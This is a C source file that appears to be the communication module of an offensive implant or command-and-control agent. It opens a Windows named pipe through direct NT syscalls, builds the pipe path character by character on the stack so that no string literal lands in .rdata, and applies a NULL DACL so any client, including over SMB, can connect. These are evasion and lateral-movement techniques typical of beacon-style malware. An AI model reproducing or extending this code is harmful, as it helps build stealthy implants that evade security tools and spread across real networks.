/**
 * Named pipe communication via NT syscalls only.
 * Uses NtCreateNamedPipeFile, NtFsControlFile, NtWriteFile, NtFlushBuffersFile.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

HANDLE open_named_pipe(const wchar_t *pipe_name) {
    /*
     * Build NT path: \??\pipe\<name>
     * Must be on stack — no string literals in .rdata
     */
    wchar_t path[256];
    /* prefix: \??\pipe\ */
    path[0] = L'\\';
    path[1] = L'?';
    path[2] = L'?';
    path[3] = L'\\';
    path[4] = L'p';
    path[5] = L'i';
    path[6] = L'p';
    path[7] = L'e';
    path[8] = L'\\';
    int off = 9;

    /* append pipe_name */
    const wchar_t *s = pipe_name;
    while (*s && off < 254) {
        path[off++] = *s++;
    }
    path[off] = L'\0';

    /* Build UNICODE_STRING */
    UNICODE_STRING us;
    us.Length = (USHORT)(off * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((off + 1) * sizeof(wchar_t));
    us.Buffer = path;

    /*
     * Build NULL DACL security descriptor in memory.
     * This allows any client (including SMB) to connect.
     */
    SECURITY_DESCRIPTOR sd;
    sd.Revision = SECURITY_DESCRIPTOR_REVISION;
    sd.Sbz1 = 0;
    sd.Control = SE_DACL_PRESENT; /* DACL present but NULL = allow all */
    sd.Owner = NULL;
    sd.Group = NULL;
    sd.Sacl = NULL;
    sd.Dacl = NULL;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, &sd);

    IO_STATUS_BLOCK iosb;
    HANDLE pipe = NULL;

    /* Timeout: -300000000 (30 seconds relative, in 100ns units) */
    LARGE_INTEGER timeout;
    timeout.QuadPart = -300000000LL;

    /*
     * NtCreateNamedPipeFile:
     *   DesiredAccess: GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE = 0xC0100000
     *   ShareAccess: FILE_SHARE_READ|FILE_SHARE_WRITE = 3
     *   CreateDisposition: FILE_OPEN_IF = 3
     *   CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT = 0x20
     *   NamedPipeType: 0 (byte), ReadMode: 0 (byte), CompletionMode: 0 (blocking)
     *   MaximumInstances: 1
     *   InboundQuota: 0, OutboundQuota: 1048576 (1MB)
     */
    NTSTATUS status = sys_NtCreateNamedPipeFile(
        &pipe,
        0xC0100000,             /* GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE */
        &oa,
        &iosb,
        3,                      /* FILE_SHARE_READ|FILE_SHARE_WRITE */
        FILE_OPEN_IF,           /* CreateDisposition */
        FILE_SYNCHRONOUS_IO_NONALERT, /* CreateOptions */
        0,                      /* NamedPipeType = byte */
        0,                      /* ReadMode = byte */
        0,                      /* CompletionMode = blocking */
        1,                      /* MaximumInstances */
        0,                      /* InboundQuota */
        1048576,                /* OutboundQuota = 1MB */
        &timeout
    );

    if (!NT_SUCCESS(status)) return NULL;

    /* Wait for client connection (FSCTL_PIPE_LISTEN) */
    IO_STATUS_BLOCK iosb2;
    status = sys_NtFsControlFile(
        pipe, NULL, NULL, NULL, &iosb2,
        FSCTL_PIPE_LISTEN,
        NULL, 0, NULL, 0
    );

    /* STATUS_PIPE_CONNECTED (0x00000108) is also success */
    if (!NT_SUCCESS(status) && status != 0x00000108) {
        sys_NtClose(pipe);
        return NULL;
    }

    return pipe;
}

BOOL write_pipe(HANDLE pipe, const void *data, DWORD size) {
    IO_STATUS_BLOCK iosb;
    NTSTATUS status = sys_NtWriteFile(pipe, NULL, NULL, NULL, &iosb,
                                       (PVOID)data, size, NULL, NULL);
    return NT_SUCCESS(status);
}

void close_pipe(HANDLE pipe) {
    IO_STATUS_BLOCK iosb;
    sys_NtFlushBuffersFile(pipe, &iosb);
    sys_NtClose(pipe);
}
